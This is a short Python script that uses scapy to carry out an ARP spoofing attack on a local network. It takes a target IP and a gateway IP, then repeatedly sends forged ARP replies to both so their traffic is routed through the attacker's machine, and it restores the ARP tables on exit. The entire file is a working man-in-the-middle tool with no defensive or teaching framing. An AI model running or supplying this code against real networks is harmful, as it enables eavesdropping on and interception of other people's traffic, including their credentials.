import scapy.all as scapy
import time
import logging
import optparse

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def get_user_input():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-t", "--target", dest="target_ip", help ="Enter Target IP address")
    parse_object.add_option("-g", dest="gateway_ip", help ="Enter Gateway IP address")
    (user_input,arguments) =  parse_object.parse_args()

    if not user_input.target_ip:
        print("Please enter target IP address")
    if not user_input.gateway_ip:
        print("Please enter gateway IP address")
    return user_input

def get_mac_address(ip):
    arp_request_packet = scapy.ARP(pdst=ip)
    # scapy.ls(scapy.ARP())
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # scapy.ls(scapy.Ether())
    combined_packet = broadcast_packet / arp_request_packet
    answered_list = scapy.srp(combined_packet, timeout=1, verbose = False)[0]
    return answered_list[0][1].hwsrc

def arp_poisoning(target_ip, poisoned_ip):
    target_mac = get_mac_address(target_ip)
    arp_response = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac,psrc = poisoned_ip)
    scapy.send(arp_response, verbose = False)
    #scapy.ls(scapy.ARP())

def reset_operation(fooled_ip, gateway_ip):
    fooled_mac = get_mac_address(fooled_ip)
    gateway_mac = get_mac_address(gateway_ip)
    arp_response = scapy.ARP(op = 2, pdst = fooled_ip, hwdst = fooled_mac,psrc = gateway_ip, hwsrc = gateway_mac)
    scapy.send(arp_response, verbose = False, count = 6)

target_ip = get_user_input().target_ip
gateway_ip = get_user_input().gateway_ip

number = 0
try:
    while True:
        arp_poisoning(target_ip,gateway_ip)
        arp_poisoning(gateway_ip,target_ip)
        number +=2
        print(f"\rSending Packets...{number}",end = " ")
        time.sleep(3)
except KeyboardInterrupt:
    print("\nExiting & Reset")
    reset_operation(target_ip,gateway_ip)
    reset_operation(gateway_ip,target_ip)